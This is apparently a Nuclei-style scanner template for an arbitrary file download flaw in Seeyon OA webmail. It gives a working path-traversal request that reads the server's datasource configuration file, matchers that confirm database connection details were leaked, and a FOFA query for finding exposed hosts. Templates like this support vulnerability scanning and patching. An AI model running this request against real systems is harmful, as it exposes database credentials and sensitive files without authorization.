id: seeyon-webmail-filedownload
info:
  name: 致远 OA webmail - filedownload
  author: leadlife
  severity: critical
  description: 致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
  reference: 
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA%20webmail.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422.md
  metadata:
    verified: false
    fofa-query: body="seeyon/index.jsp"
  tags: seeyon,filedownload,oa

http:
  - raw:
      - |
        GET /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "mysql"
          - "ctpDataSource"
          - "jdbc"
        condition: and

      - type: status
        status:
          - 200